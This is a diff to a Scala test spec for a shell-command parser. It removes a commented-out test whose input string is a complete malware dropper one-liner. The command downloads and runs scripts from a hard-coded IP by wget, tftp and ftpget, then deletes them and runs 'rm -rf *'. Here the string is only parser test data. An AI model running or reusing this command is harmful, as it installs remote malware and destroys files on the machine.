@@ -60,21 +60,4 @@ class CmdParserSpec extends FlatSpec with Matchers {
     println(parse(cmd3))
   }
 
-  //  it should " " in {
-  //    import shapeless._
-  //    import poly._
-  //    object plus extends Poly2 {
-  //      implicit val caseInt = at[Int, Int](_ + _)
-  //      implicit val caseDouble = at[Double, Double](_ + _)
-  //      implicit val caseString = at[String, String](_ + _)
-  //      implicit def caseList[T] = at[List[T], List[T]](_ ::: _)
-  //    }
-  //    val cmd3 = """cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.221/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.172.110.221 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.172.110.221; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.172.110.221 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"""
-  //    val exp = parse(cmd3).right.get
-  //    //count
-  //    object count extends ->((_: OrCombinator) => 1)
-  //    val orCount = everything(count)(plus)(exp.asInstanceOf[OrCombinator])
-  //    println(orCount)
-  //  }
-
 }
